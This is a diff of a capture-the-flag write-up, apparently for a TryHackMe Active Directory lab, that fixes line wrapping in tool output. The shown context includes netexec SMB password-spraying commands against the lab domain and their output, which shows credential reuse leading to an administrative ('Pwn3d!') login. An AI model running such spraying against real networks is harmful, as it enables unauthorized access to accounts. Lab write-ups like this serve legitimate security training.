@@ -270,8 +270,7 @@ Let's try a password spraying, hoping we can get some user with same password.
 
 ```bash
 kali@kali:nxc smb ad.thm.local -u users.txt -p 'MK..o0' --continue-on-success
-SMB         10.48.190.241   445    AD               [*] Windows 10 / Server 2019 Build 17763 x64 (name:AD) (domain:thm.local) (signing:True) (SMBv1:None) (Null
-Auth:True)
+SMB         10.48.190.241   445    AD               [*] Windows 10 / Server 2019 Build 17763 x64 (name:AD) (domain:thm.local) (signing:True) (SMBv1:None) (Null Auth:True)
 SMB         10.48.190.241   445    AD               [-] thm.local\Administrator:MK..o0 STATUS_LOGON_FAILURE
 SMB         10.48.190.241   445    AD               [-] thm.local\Guest:MK..o0 STATUS_LOGON_FAILURE
 SMB         10.48.190.241   445    AD               [-] thm.local\krbtgt:MK..o0 STATUS_LOGON_FAILURE
@@ -291,8 +290,7 @@ That was a success, user ZACHARY_HUNT also has the same password.
 
 ```bash
 kali@kali:nxc smb 10.48.190.241 -u ZACHARY_HUNT -p 'MK...o0'
-SMB         10.48.190.241   445    AD               [*] Windows 10 / Server 2019 Build 17763 x64 (name:AD) (domain:thm.local) (signing:True) (SMBv1:None) (Null
-Auth:True)
+SMB         10.48.190.241   445    AD               [*] Windows 10 / Server 2019 Build 17763 x64 (name:AD) (domain:thm.local) (signing:True) (SMBv1:None) (Null Auth:True)
 SMB         10.48.190.241   445    AD               [+] thm.local\ZACHARY_HUNT:MK...o0
 ```
 
@@ -374,8 +372,7 @@ Yay !!! We have a cleartext credentials for user sanford_daugherty.
 
 ```bash
 kali@kali:nxc smb 10.48.190.241 -u SANFORD_DAUGHERTY -p 'RE...23'
-SMB         10.48.190.241   445    AD               [*] Windows 10 / Server 2019 Build 17763 x64 (name:AD) (domain:thm.local) (signing:True) (SMBv1:None) (Null
-Auth:True)
+SMB         10.48.190.241   445    AD               [*] Windows 10 / Server 2019 Build 17763 x64 (name:AD) (domain:thm.local) (signing:True) (SMBv1:None) (Null Auth:True)
 SMB         10.48.190.241   445    AD               [+] thm.local\SANFORD_DAUGHERTY:RE...123 (Pwn3d!)
 ```
 
